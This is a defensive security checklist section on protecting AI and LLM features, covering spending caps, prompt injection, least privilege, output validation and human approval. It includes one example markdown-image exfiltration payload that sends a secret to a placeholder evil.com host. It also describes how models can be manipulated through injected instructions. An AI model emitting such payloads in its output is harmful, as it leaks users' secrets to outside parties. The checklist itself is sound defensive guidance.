# 7. AI & LLM features

**Priority:** Ship-blocker · **Theme:** Security · **Checks:** 14

LLMs take instructions from anywhere, cost money per call and can be talked into things. Box them in.

- [ ] **Set an AI spending cap**: hard budget limits on every provider account.
- [ ] **Cap AI usage per user**: requests and tokens per day, so one account can't drain your budget.
- [ ] **Mitigate prompt injection**: treat user and retrieved content as data, not instructions, and keep system prompts and tools separate from user text.
- [ ] **Validate AI output**: schema-check structured output, never `eval` it or render it as raw HTML, and never run AI-generated SQL or shell without guards.
- [ ] **Give AI least-privilege permissions**: the model's tools and DB role can only do what that feature needs.
- [ ] **Enforce permissions in the AI tool layer**: the AI can't fetch another user's data just because it was "asked nicely".
- [ ] **Don't leak secrets via the prompt**: no keys, internal URLs or other users' data in context.
- [ ] **Watch for indirect prompt injection**: documents, emails, web pages and filenames the AI reads can carry instructions. Treat them as hostile.
- [ ] **Assume your system prompt will leak**: nothing secret goes in it.
- [ ] **Block markdown-image exfiltration**: don't auto-render images/links from AI output to arbitrary domains (`![](https://evil.com/?q=SECRET)`).
- [ ] **Require human approval for destructive tool calls**: sending, deleting, paying, deploying.
- [ ] **Make RAG respect permissions**: retrieval filters by the current user's access, not "everything in the vector DB".
- [ ] **Set the model and `max_tokens` on the server**: never let the client choose an expensive model or unbounded output.
- [ ] **Log every AI tool call**: who asked, what went in, what came out.

---

Previous: [6. Payments & webhooks](06-payments-and-webhooks.md) · [All sections](../../README.md#contents) · Next: [8. File uploads & storage](08-file-uploads-and-storage.md)
